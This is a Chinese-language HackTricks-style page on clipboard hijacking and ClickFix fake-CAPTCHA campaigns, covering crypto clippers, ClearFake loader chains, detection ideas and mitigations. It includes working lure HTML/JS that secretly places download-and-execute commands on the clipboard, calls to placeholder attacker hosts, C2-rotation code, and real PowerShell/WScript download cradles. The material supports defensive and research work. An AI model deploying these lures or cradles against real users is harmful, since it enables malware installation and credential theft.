# Clipboard Hijacking（Pastejacking）攻击

{{#include ../../banners/hacktricks-training.md}}

> “永远不要粘贴任何不是你自己复制的内容。”——这条建议虽然老套，但仍然有效

## 概述

Clipboard hijacking——也称为 *pastejacking*——利用了用户经常在未检查命令内容的情况下进行复制和粘贴这一事实。恶意网页（或任何支持 JavaScript 的环境，例如 Electron 或 Desktop 应用程序）会以编程方式将攻击者控制的文本写入系统剪贴板。攻击者通常会通过精心设计的社会工程学指令，引导受害者按下 **Win + R**（运行对话框）、**Win + X**（Quick Access / PowerShell），或打开终端并*粘贴*剪贴板内容，从而立即执行任意命令。

由于**不会下载文件，也不会打开附件**，该技术能够绕过大多数用于监控附件、宏或直接命令执行的电子邮件和 Web 内容安全控制。因此，这种攻击在传播 NetSupport RAT、Latrodectus loader 或 Lumma Stealer 等常见 malware 家族的 phishing 活动中非常流行。<sup>[[1]](#references)</sup>

## 钱包地址替换 clippers

另一种 **clipboard hijacking** 变体完全不会粘贴命令：它会等待受害者复制**cryptocurrency wallet 地址**，然后在粘贴前悄悄将其替换为攻击者控制的地址。对于较长的钱包格式，这种方式尤其有效，因为用户通常只会核对开头和结尾的字符。<sup>[[8]](#references)</sup>

常见的真实攻击特征：
- **Thin loader + nested payload**：可见的 app/exe 看起来像合法的 trading 或“profit”工具，而真正的 clipper 则隐藏在 bundle 更深层的位置（例如由 .NET loader 启动一个嵌套的 Rust payload）。
- **Regex-driven replacement**：malware 会匹配类似 `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...` 的字符串，甚至是通用的 **44-character Solana-like** 字符串，并将其重写为攻击者的钱包地址。
- **Wallet rotation at scale**：现代 Windows 样本可能会为每种 currency 内置**数千个**替换钱包，而不是使用单个静态地址，从而在每次盗窃后减少钱包 reputation burn。<sup>[[8]](#references)</sup>

### Windows clipper 流程

一种常见实现是注册了 **`AddClipboardFormatListener`** 的隐藏窗口。每次剪贴板更新时，malware 通常会调用：<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 访问当前剪贴板数据。
- **`GetClipboardData`** → 读取文本。
- **`EmptyClipboard`** + **`SetClipboardData`** → 将钱包字符串替换为攻击者的值。

clippers 中经常出现的最小 hunting regex：
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
用户级 persistence 足以造成影响。一种观察到的模式是：<sup>[[8]](#references)</sup>
- 将 payload 复制到 **`%APPDATA%\silke\silke.exe`**
- 在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 下创建 **Startup-folder LNK**

检测思路：
- 持续调用 clipboard APIs，同时在 `%APPDATA%` 和用户 **Startup** 文件夹下写入数据的进程。
- 创建新的 LNK/可执行文件，随后对 wallet-address clipboard 进行重写。
- 包含大量未使用文件以及一个用于启动嵌套 binary 的小型 launcher 的压缩包或 fake-software bundles。

### macOS social-engineered quarantine removal + LaunchAgent persistence

在 macOS 上，一些 campaign 会提供一个 **`unlocker.command`** helper，并指导受害者在 Gatekeeper 提示应用已损坏或来自未识别开发者时，右键点击 → **Open**。该脚本只会移除 quarantine，然后启动附近的 `.app`：<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
这**不是** Gatekeeper exploit；这是一个**社会工程学 quarantine bypass**，利用了 Gatekeeper 的决策依赖于 `com.apple.quarantine` xattr 这一事实。<sup>[[8]](#references)</sup>

执行后，该 clipper 可以通过写入以下内容，以当前用户身份实现持久化：<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – 包含 `RunAtLoad` 和 `KeepAlive` 的 LaunchAgent

一个有用的防御细节是，某些样本实现了**自修复 watchdog**，每隔约 30 秒重新写入 LaunchAgent 和 wrapper。如果你先删除 plist，**但不终止正在运行的进程**，malware 可能会立即重新创建它。<sup>[[8]](#references)</sup> 安全的清理顺序：
1. 终止正在运行的 clipper 进程。
2. 卸载并删除 LaunchAgent plist。
3. 删除 `~/launch.sh` 和复制出的 payload。

### Delivery note：虚假信誉作为 force multiplier

对于这一家族，malware 本身可以保持技术上的简单，而**distribution layer** 承担主要工作：通过伪造 GitHub stars/forks、SourceForge reviews/downloads、YouTube tutorial comments/views，以及看似正常的 VirusTotal comments/votes，让 binary 在执行前显得值得信任。<sup>[[8]](#references)</sup>

## 强制复制按钮和隐藏 payload（macOS one-liners）

某些 macOS infostealers 会克隆 installer sites（例如 Homebrew），并**强制使用“Copy”按钮**，使用户无法只选中可见文本。clipboard entry 中包含预期的 installer command，以及追加的 Base64 payload（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴即可同时执行两者，而 UI 会隐藏额外的 stage。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
较早的 campaigns 使用 `document.execCommand('copy')`，较新的 campaigns 则依赖异步 **Clipboard API**（`navigator.clipboard.writeText`）。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake 流程

1. 用户访问 typosquatted 或遭入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` helper，在不引起注意的情况下将经过 Base64 编码的 PowerShell one-liner 存入剪贴板。
3. HTML 指示受害者：*“按下 **Win + R**，粘贴 command，然后按 Enter 以解决问题。”*
4. `powershell.exe` 执行并下载一个 archive，其中包含合法 executable 以及恶意 DLL（经典 DLL sideloading）。
5. loader 解密其他 stages，注入 shellcode 并安装 persistence（例如 scheduled task），最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。<sup>[[1]](#references)</sup>

### NetSupport RAT Chain 示例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（合法的 Java WebStart）会在其目录中搜索 `msvcp140.dll`。
* 恶意 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），使用滚动 XOR 密钥 `"https://google.com/"` 解密它们，注入最终的 shellcode，并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 将 `libcef.dll` 放置在签名应用旁 → DLL sideloading → shellcode → Latrodectus。<sup>[[1]](#references)</sup>

### 通过 MSHTA 获取 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 调用会启动一个隐藏的 PowerShell 脚本，该脚本获取 `PartyContinued.exe`，提取 `Boat.pst`（CAB），通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，最后运行一个会将浏览器凭据外传至 `sumeriavgv.digital` 的 `.a3x` 脚本。<sup>[[1]](#references)</sup>

## ClickFix：剪贴板 → PowerShell → JS eval → 带轮换 C2 的启动项 LNK（PureHVNC）

某些 ClickFix campaigns 完全跳过文件下载，转而指示受害者粘贴一条 one-liner，通过 WSH 获取并执行 JavaScript，使其持久化，并每天轮换 C2。观察到的示例链：<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 在运行时反转经过混淆的 URL，以规避随意检查。
- JavaScript 通过 Startup LNK（WScript/CScript）实现持久化，并根据当前日期选择 C2，从而实现快速域名轮换。<sup>[[3]](#references)</sup>

用于按日期轮换 C2 的最小 JS 片段：<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常会部署一个 loader 来建立 persistence 并拉取 RAT（例如 PureHVNC），通常会固定使用硬编码的 certificate 进行 TLS pinning，并对流量进行分块处理。<sup>[[3]](#references)</sup>

此变体的特定检测思路
- Process tree：`explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- Startup artifacts：位于 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 中的 LNK，调用 WScript/CScript 并执行 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- Registry/RunMRU 和 command-line telemetry 中包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复执行 `powershell -NoProfile -NonInteractive -Command -`，并通过较大的 stdin payload 输入长脚本，从而避免过长的 command line。
- Scheduled Tasks 随后执行 LOLBins，例如在类似 updater 的 task/path 下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

Threat hunting
- 每日轮换的 C2 hostnames 和 URLs，符合 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联 clipboard write events，随后出现 Win+R paste，并立即执行 `powershell.exe`。

Blue-teams 可以结合 clipboard、process-creation 和 registry telemetry，定位 pastejacking abuse：

* Windows Registry：`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 保存 **Win + R** commands 的历史记录——查找异常的 Base64 / obfuscated entries。
* Security Event ID **4688**（Process Creation）：其中 `ParentImage` == `explorer.exe`，且 `NewProcessName` 属于 { `powershell.exe`、`wscript.exe`、`mshta.exe`、`curl.exe`、`cmd.exe` }。
* 在可疑 4688 event 之前，检查 `%LocalAppData%\Microsoft\Windows\WinX\` 或 temporary folders 下的 file creations 对应的 Event ID **4663**。
* EDR clipboard sensors（如果存在）——关联 `Clipboard Write`，随后立即出现新的 PowerShell process。

## IUAM-style verification pages（ClickFix Generator）：clipboard copy-to-console + OS-aware payloads

近期的 campaigns 会批量生成伪造的 CDN/browser verification pages（"Just a moment…"、IUAM-style），诱导用户将 OS-specific commands 从 clipboard 复制到 native consoles 中。这会将 execution 转移出 browser sandbox，并可在 Windows 和 macOS 上运行。<sup>[[4]](#references)</sup>

由 builder 生成的页面的主要特征
- 通过 `navigator.userAgent` 进行 OS detection，以定制 payloads（Windows PowerShell/CMD 与 macOS Terminal）。对于不受支持的 OS，可选择使用 decoys/no-ops 来维持假象。
- 在无害的 UI actions（checkbox/Copy）上自动执行 clipboard-copy，而可见文本可能与 clipboard content 不同。
- 阻止 mobile，并显示包含分步 instructions 的 popover：Windows → Win+R→paste→Enter；macOS → open Terminal→paste→Enter。
- 可选的 obfuscation 和 single-file injector，用于使用 Tailwind-styled verification UI 覆盖 compromised site 的 DOM（无需注册新 domain）。<sup>[[4]](#references)</sup>

示例：clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 初次运行的持久化
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`，以便终端关闭后仍继续执行，减少可见痕迹。<sup>[[4]](#references)</sup>

对已入侵网站进行原地页面劫持
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
针对 IUAM-style lures 的检测与 hunting 思路
- Web：将 Clipboard API 绑定到 verification widgets 的页面；显示文本与 clipboard payload 不一致；基于 `navigator.userAgent` 的分支逻辑；可疑上下文中的 Tailwind + single-page replace。
- Windows endpoint：浏览器交互后不久出现 `explorer.exe` → `powershell.exe`/`cmd.exe`；从 `%TEMP%` 执行 batch/MSI installers。
- macOS endpoint：浏览器事件附近，Terminal/iTerm 生成 `bash`/`curl`/`base64 -d`，并使用 `nohup`；关闭 terminal 后 background jobs 仍然存活。
- 将 `RunMRU` Win+R history 和 clipboard writes 与后续 console process creation 进行关联。

另请参阅 supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix 演变（ClearFake、Scarlet Goldfinch）

- ClearFake 继续入侵 WordPress sites，并注入串联 external hosts（Cloudflare Workers、GitHub/jsDelivr）的 loader JavaScript，甚至发起 blockchain “etherhiding” calls（例如向 Binance Smart Chain API endpoints，如 `bsc-testnet.drpc[.]org`，发送 POST）以获取当前 lure logic。近期的 overlays 大量使用 fake CAPTCHAs，指示用户复制/粘贴 one-liner（T1204.004），而不是下载任何内容。<sup>[[6]](#references)</sup>
- Initial execution 越来越多地交由 signed script hosts/LOLBAS 处理。2026 年 1 月的 chains 使用内置的 `SyncAppvPublishingServer.vbs`（通过 `WScript.exe` 执行）替代此前的 `mshta`，并传入带有 aliases/wildcards 的 PowerShell-like arguments，以获取 remote content：<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` 已签名，通常由 App-V 使用；但与 `WScript.exe` 及异常参数（`gal`/`gcm` 别名、使用通配符的 cmdlet、jsDelivr URLs）结合后，会成为 ClearFake 的高信号 LOLBAS 阶段。<sup>[[6]](#references)</sup>
- 2026 年 2 月，fake CAPTCHA payload 又转回了纯 PowerShell download cradles。两个活跃示例：<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 第一个链是内存中的 `iex(irm ...)` grabber；第二个链通过 `WinHttp.WinHttpRequest.5.1` 分阶段执行，将内容写入临时 `.ps1` 文件，然后在隐藏窗口中使用 `-ep bypass` 启动。<sup>[[6]](#references)</sup>

这些变体的检测/狩猎提示
- 进程链：浏览器 → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`，或在剪贴板写入/Win+R 操作后立即出现 PowerShell cradles。
- 命令行关键词：`SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker 域名，或原始 IP `iex(irm ...)` 模式。
- 网络：脚本主机或 PowerShell 在网页浏览后不久向 CDN worker 主机或 blockchain RPC 端点发起出站连接。
- 文件/注册表：在 `%TEMP%` 下创建临时 `.ps1` 文件，同时 RunMRU 条目包含这些单行命令；对于 signed-script LOLBAS（WScript/cscript/mshta）执行带有外部 URL 或混淆别名字符串的命令，应进行阻止/告警。

## 2026 年 6 月 ClickFix tradecraft：粘贴遥测、虚假验证评论和 LOLBin chaining

近期 Red Canary 遥测表明，稳定指标**不是某一条确切命令**，而是**用户辅助的粘贴并运行**、**受信任的解释器/LOLBins**、**混淆标志**、**远程获取**以及**立即执行**的组合。<sup>[[7]](#references)</sup>

### 值得注意的 operator 模式

- **粘贴确认遥测**：某些 payload 会在真正的 stage 执行前调用 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`。这会确认用户交互，同时让窗口保持短暂且安静。
- **虚假验证评论**：PowerShell 单行命令可能追加类似 `# Security check ✔️ I'm not a robot Verification ID: 138105` 的字符串，使命令被粘贴到 Run / `cmd.exe` / PowerShell 历史记录后，看起来仍与 CAPTCHA 相关。
- **动态 URL 重构**：`iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` 避免在命令行中出现静态 URL，同时仍执行内存中的 download-and-execute。
- **伪装的 installer 执行**：`"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` 利用标志中的异常大小写和类似 Unicode 的字符破坏脆弱的检测规则，同时仍保持类似 `msiexec.exe` 的外观。
- **使用脱字符转义的 LOLBin chains**：`cmd.exe` 可以通过 `^` 转义隐藏关键词（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`），以最小化状态启动嵌套 shell，使用 `.pdf` 等良性扩展名保存 attacker 内容，然后通过 `mshta` 执行它。<sup>[[7]](#references)</sup>
## 缓解措施

1. 浏览器加固 – 禁用剪贴板写入权限（`dom.events.asyncClipboard.clipboardItem` 等），或要求用户手势。
2. Security awareness – 教导用户*手动输入*敏感命令，或先将其粘贴到文本编辑器中。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control，以阻止任意单行命令。
4. 网络控制 – 阻止向已知 pastejacking 和 malware C2 域名发起出站请求。

## 相关 Tricks

* **Discord Invite Hijacking** 经常在诱导用户进入恶意服务器后滥用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考资料

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
